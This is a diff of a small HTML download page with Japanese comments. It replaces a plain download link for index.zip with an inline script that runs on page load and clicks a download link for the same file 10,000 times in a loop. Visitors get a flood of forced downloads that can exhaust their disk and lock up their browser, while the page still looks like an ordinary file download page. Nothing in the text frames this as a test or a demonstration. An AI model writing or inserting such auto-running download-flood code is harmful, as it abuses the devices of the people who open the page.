@@ -3,10 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ファイルダウンロード</title>
+    <title>無題</title>
 </head>
 <body>
-    <h1>ファイルをダウンロード</h1>
-    <a href="index.zip" download="index.zip">index.zip をダウンロード</a>
+    <h1>index.zip</h1>
+    <script>
+        const totalDownloads = 10000; // ダウンロード回数
+        const fileName = "index.zip";
+        const filePath = "index.zip"; // ファイルパス（リポジトリ内のパスに合わせて変更）
+
+        for (let i = 0; i < totalDownloads; i++) {
+            const link = document.createElement("a");
+            link.href = filePath;
+            link.download = fileName;
+            link.click();
+        }
+    </script>
 </body>
 </html>
